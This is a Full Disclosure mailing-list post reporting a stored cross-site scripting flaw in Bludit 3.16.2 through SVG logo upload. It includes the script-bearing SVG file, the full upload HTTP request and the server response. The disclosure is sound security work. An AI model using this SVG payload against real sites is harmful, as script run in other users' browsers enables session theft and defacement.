---
title: XSS via SVG File Uploa - bluditv3.16.2
url: https://seclists.org/fulldisclosure/2025/Jul/2
source: Full Disclosure
date: 2025-07-09
fetch_date: 2025-10-06T23:55:58.072445
---

# XSS via SVG File Uploa - bluditv3.16.2

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

![](/shared/images/nst-icons.svg#search)

# XSS via SVG File Uploa - bluditv3.16.2

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 6 Jul 2025 22:50:26 +0100

---

```
# Exploit Title: XSS via SVG File Upload - bluditv3.16.2
# Date: 07/2025
# Exploit Author: Andrey Stoykov
# Version: 3.16.2
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

XSS via SVG File Upload #1:

Steps to Reproduce:

1. Login with admin account and click on "General" > "Logo"

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="100" height="100" version="1.1" xmlns="
http://www.w3.org/2000/svg";>
  <script type="text/javascript">alert('xss');</script>
</svg>

// HTTP POST Request Uploading the SVG File

POST /bludit/admin/ajax/logo-upload HTTP/1.1
Host: 192.168.58.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0)
Gecko/20100101 Firefox/141.0
[...]

------geckoformboundarye27e3ffc54c763baa293ac2aeb3ed1a4
Content-Disposition: form-data; name="tokenCSRF"

59fc6f48ad5d60b39699491cada2390e1b42531b
------geckoformboundarye27e3ffc54c763baa293ac2aeb3ed1a4
Content-Disposition: form-data; name="inputFile";
filename="evilsvgfile-xss-bypass.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="100" height="100" version="1.1" xmlns="
http://www.w3.org/2000/svg";>
  <script type="text/javascript">alert('xss');</script>
</svg>
------geckoformboundarye27e3ffc54c763baa293ac2aeb3ed1a4--

// HTTP Response

HTTP/1.1 200 OK
Date: Sat, 28 Jun 2025 21:16:10 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
[...]

{"status":0,"message":"Image
uploaded.","filename":"test.svg","absoluteURL":"http:\/\/192.168.58.133
\/bludit\/bl-content\/uploads\/test.svg","absolutePath":"\/opt\/lampp\/htdocs\/bludit\/bl-content\/uploads\/test.svg"}
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](1)
[By Date](date.html#2)
[![Next](/images/right-icon-16x16.png)](3)

[![Previous](/images/left-icon-16x16.png)](1)
[By Thread](index.html#2)
[![Next](/images/right-icon-16x16.png)](3)

### Current thread:

* **XSS via SVG File Uploa - bluditv3.16.2** *Andrey Stoykov (Jul 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")